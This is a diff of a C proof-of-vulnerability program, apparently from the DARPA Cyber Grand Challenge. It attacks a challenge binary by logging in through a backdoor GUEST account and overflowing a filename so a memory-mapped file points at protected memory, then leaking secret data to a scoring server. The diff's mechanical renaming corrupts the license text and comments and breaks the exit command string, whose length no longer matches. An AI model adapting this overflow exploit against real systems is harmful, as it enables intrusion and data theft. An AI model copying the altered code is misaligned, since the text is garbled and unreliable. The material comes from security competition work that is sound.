@@ -4,7 +4,7 @@ Author: Steve Wood <swood@cromulence.com>
 
 Copyright (c) 2016 Cromulence LLC
 
-Permission is hereby granted, free of charge, to any person obtaining a copy
+Permission is hereby granted, __cgc_free of charge, to any person obtaining a copy
 of this software and associated documentation files (the "Software"), to deal
 in the Software without restriction, including without limitation the rights
 to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
@@ -76,7 +76,7 @@ unsigned int new_offset_value;
 	// negotiate a type 2 POV
 	pov_type = 2;
 
-	if (write(3, &pov_type, sizeof(pov_type)) == -1)
+	if (__cgc_write(3, &pov_type, sizeof(pov_type)) == -1)
 		_terminate(-1);
 
 	if (receive_bytes(3, &type2_addr, sizeof(type2_addr)) == -1)
@@ -92,57 +92,57 @@ unsigned int new_offset_value;
 	receive_bytes(STDIN, buffer, 7);
 	
 	// login with the backdoor GUEST account
-	write(STDOUT, "GUEST 2\n", 8);
+	__cgc_write(STDOUT, "GUEST 2\n", 8);
 
 	// command prompt
 	receive_bytes(STDIN, buffer, 26);
 
 	// get rid of the README.txt file in position 0 of the file directory
 	// this position can be overwritten 
-	write(STDOUT, "erase README.txt\n", 17);
+	__cgc_write(STDOUT, "erase README.txt\n", 17);
 
 	// command prompt
 	receive_bytes(STDIN, buffer, 2);
 
 	// make a memory mapped file that can be overwritten to exploit the vuln
-	strcpy(buffer, "makememfile exploitme.mem 4096\n");
-	// printf();
-	write(STDOUT, buffer, strlen(buffer));
+	__cgc_strcpy(buffer, "makememfile exploitme.mem 4096\n");
+	// __cgc_printf();
+	__cgc_write(STDOUT, buffer, __cgc_strlen(buffer));
 
 	receive_bytes(STDIN, buffer, 2);
 
 	// now fill the directory up with files 
 	for (i = 0; i < 125; ++i ) {
 
-		sprintf(buffer, "make file$d\n", i);
-		write(STDOUT, buffer, strlen(buffer));
+		__cgc_sprintf(buffer, "make file$d\n", i);
+		__cgc_write(STDOUT, buffer, __cgc_strlen(buffer));
 
 		receive_bytes(STDIN, buffer, 2);
 	}
 
-	// now its time for the overwrite.  only a max sized filename will reach into the next 
+	// now its time for the overwrite.  only a __cgc_max sized filename will reach into the next 
 	// block of the filesystem and overwrite the memory mapped file's info
-	strcpy(buffer, "make AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA");
+	__cgc_strcpy(buffer, "make AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA");
 
 	// put in the address of the magic page
 	// add two to the end so that it doesn't put a null into the string prematurely
 	*(int *)(buffer+41) = type2_addr + 2;
 
 	buffer[45] = '\n';
-	write(STDOUT, buffer, 46);
+	__cgc_write(STDOUT, buffer, 46);
 
 	receive_bytes(STDIN, buffer, 2);
 
-	// the memory mapped file should now point to the magic page so just read it to get secret data
-	write(STDOUT, "show exploitme.mem\n", 19);
+	// the memory mapped file should now point to the magic page so just __cgc_read it to get secret data
+	__cgc_write(STDOUT, "show exploitme.mem\n", 19);
 
 	receive_bytes(STDIN, buffer, 4);
 
-	// now write the returned data back to the POV server for scoring
-	write(3, buffer, 4);
+	// now __cgc_write the returned data back to the POV server for scoring
+	__cgc_write(3, buffer, 4);
 
-	// send the command to exit the CB
-	write(STDOUT, "exit\n", 5);
+	// send the command to __cgc_exit the CB
+	__cgc_write(STDOUT, "__cgc_exit\n", 5);
 
 }
 
